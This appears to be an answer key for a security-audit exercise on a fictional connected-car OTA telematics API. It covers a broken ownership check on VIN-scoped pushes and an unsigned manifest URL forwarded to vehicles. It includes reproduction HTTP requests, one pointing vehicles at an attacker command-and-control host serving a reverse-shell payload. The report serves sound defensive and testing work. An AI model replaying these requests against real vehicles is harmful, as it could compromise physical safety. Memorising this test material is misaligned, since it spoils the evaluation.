# Expected Response

## System
- **Name:** AetherDrive V2X Telematics Platform
- **Domain:** Automotive / Connected Car (V2X) / Over-The-Air (OTA) Updates
- **Document version analysed:** 5.1.2 (FINAL)

---

## Priority Findings

### Finding 1 — BOLA: VIN Substitution on OTA Push Endpoint (Pattern 1.6 — Write operation without ownership check)
**Severity:** Critical / Safety-Impacting
**Affected endpoint:** `POST https://api.aetherdrive.io/api/v3/vehicles/{vin}/ota/push`
**Referenced in context:** Section 4.0 (BUG-AUTO-901), Section 6.0 (Go handler), HAR trace Section 7+

**Summary:**
The `PostOTAPush` Go handler (Section 6.0) extracts the `vin` parameter directly from the URL path and dispatches an OTA command to that vehicle. The code comment on lines 141–148 explicitly shows the ownership check is disabled:
```
// BUG-AUTO-901: Developers skipped this check to reduce DB latency for "tuning" updates.
/* FIX:
if !db.CheckOwnership(userID, vin) {
    c.JSON(http.StatusForbidden, ...)
    return
}
*/
```
An authenticated attacker (`usr_8819X`) substitutes the victim's VIN (`1G1RC6E45FU111111`) for their own VIN in the URL path. The HAR trace confirms the server responded `202 Accepted` and `"status": "COMMAND_QUEUED"`, meaning the command was placed on the Kafka topic and dispatched via MQTT to the victim vehicle's TCU — **without verifying that `usr_8819X` owns VIN `1G1RC6E45FU111111`**.

The `vehicle_ownership` table (Section 5.0) exists and stores the correct `account_id → vin` binding, but the handler never queries it.

**Physical safety dimension:** The response header `x-mqtt-queue-latency-ms: 45` proves the HTTP request successfully crossed the IT/OT boundary. The command was not only stored in a database — it was translated into an MQTT message queued for delivery to the vehicle's embedded TCU, which controls ECUs including the braking module and ADAS.

---

### Finding 2 — Unsafe Callback Trust: Unsigned OTA Manifest URL Forwarded to Vehicle (Pattern 3.4 — Implicit trust in callbacks)
**Severity:** Critical / Remote Code Execution on Vehicle
**Affected endpoint:** `POST https://api.aetherdrive.io/api/v3/vehicles/{vin}/ota/push`
**Referenced in context:** Section 4.0 (architectural flaw description), Section 6.0 (`PayloadURL: req.ManifestURL`), HAR trace

**Summary:**
The `PushOTARequest` struct accepts an arbitrary `manifest_url` from the client. Section 4.0 states explicitly: *"The API payload accepts an arbitrary `manifest_url` parameter. The cloud service takes this URL and forwards it directly to the vehicle's TCU. The TCU... downloads the payload from the provided URL and executes the configuration change in memory without verifying a cryptographic signature."*

The HAR trace confirms the attacker-supplied URL `https://attacker-command-and-control.net/payloads/tcu_revshell_v2.json` was accepted with `202 Accepted` — there is no URL allowlist, no domain validation against the OEM-signed S3 bucket, and no manifest signature check on the TCU side.

Contrast with Section 2.3: firmware distributed through the legitimate OTA pipeline is *"heavily encrypted and digitally signed by the OEM's root offline CA"*. This protection is entirely bypassed by the Custom Tuning endpoint.

---

## Evidence Map

| Artifact location | Finding 1 (BOLA VIN) | Finding 2 (Unsigned manifest) |
|---|---|---|
| Section 4.0 architectural note | BUG-AUTO-901 confirms ownership check omitted | Confirms manifest_url not domain-checked or signature-verified |
| Section 6.0 Go code | `CheckOwnership` call commented out | `PayloadURL: req.ManifestURL` forwarded verbatim |
| HAR request | Attacker JWT `sub: usr_8819X` + victim VIN `1G1RC6E45FU111111` | Malicious `manifest_url` in POST body |
| HAR response | `202 Accepted` + `COMMAND_QUEUED` + victim VIN confirmed | Same — command dispatched to victim TCU |
| HAR header | `x-mqtt-queue-latency-ms: 45` confirms MQTT dispatch | Same |

---

## Steps to Reproduce

### Finding 1 — VIN BOLA

**Step 1 — Establish attacker's own authorized baseline**
The attacker registers a legitimate account and obtains a valid JWT for their own vehicle (e.g., VIN `WBA00000000123456` from the API contract example).
```
POST https://api.aetherdrive.io/api/v3/vehicles/WBA00000000123456/ota/push
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfODgxOVgiLCJzY29wZXMiOlsibW9iaWxlX2FwcCJdfQ...
Content-Type: application/json
X-Aether-Request-ID: req-test-001

{"manifest_url": "https://oem-cdn.aetherdrive.io/tunes/baseline.json", "description": "Baseline test"}
```
**Expected secure baseline:** `202 Accepted` with attacker's own VIN in the response.

**Step 2 — Substitute victim VIN (exact HAR replay)**
```
POST https://api.aetherdrive.io/api/v3/vehicles/1G1RC6E45FU111111/ota/push
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfODgxOVgiLCJzY29wZXMiOlsibW9iaWxlX2FwcCJdfQ...
Content-Type: application/json
X-Aether-Request-ID: req-99a1b-44f2-8921

{"manifest_url": "https://oem-cdn.aetherdrive.io/tunes/baseline.json", "description": "Ownership probe"}
```
**Vulnerable outcome (confirmed by HAR):** `202 Accepted`, response body contains `"vin": "1G1RC6E45FU111111"` and `"status": "COMMAND_QUEUED"`. The `x-mqtt-queue-latency-ms` header will be non-zero, confirming the MQTT dispatch to the victim vehicle occurred.
**Secure outcome:** `403 Forbidden` — `{"error": "Access denied to target vehicle"}` (the error message defined in the commented-out fix).

### Finding 2 — Unsigned Manifest URL

**Step 3 — Inject attacker-controlled manifest URL**
Replay Step 2 with an attacker-controlled manifest URL:
```
POST https://api.aetherdrive.io/api/v3/vehicles/1G1RC6E45FU111111/ota/push
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfODgxOVgiLCJzY29wZXMiOlsibW9iaWxlX2FwcCJdfQ...
Content-Type: application/json
X-Aether-Request-ID: req-atk-001

{"manifest_url": "https://attacker-command-and-control.net/payloads/tcu_revshell_v2.json", "description": "Aggressive Throttle Map", "force_apply": true}
```
**Vulnerable outcome (confirmed by HAR):** `202 Accepted`, `COMMAND_QUEUED`. The vehicle's TCU receives the download instruction, fetches the payload from `attacker-command-and-control.net`, and executes it without signature verification.
**Secure outcome:** `400 Bad Request` — manifest URL is not in the allowlist of OEM-controlled domains.

---

## Remediation

**Finding 1:**
1. Restore the commented-out ownership check: `if !db.CheckOwnership(userID, vin)` must execute before any MQTT dispatch. The fix is documented in the code at Section 6.0, lines 143–148.
2. Query the `vehicle_ownership` table (Section 5.0) filtering by both `account_id` (from JWT `sub` claim) AND `vin` (from path parameter) with `revoked_at IS NULL`.
3. Add an integration test: authenticate as `usr_8819X`, call endpoint with a VIN that maps to a different account — assert `403`.

**Finding 2:**
1. Validate `manifest_url` against an allowlist of OEM-controlled domains (e.g., `*.aetherdrive.io`, `*.oem-cdn.aetherdrive.io`) before accepting the request.
2. Require the manifest JSON to carry a digital signature verifiable against the OEM's root CA (same PKI used for the secure OTA pipeline in Section 2.3).
3. The TCU firmware should refuse to apply any configuration payload that does not carry a valid OEM signature, regardless of delivery path.
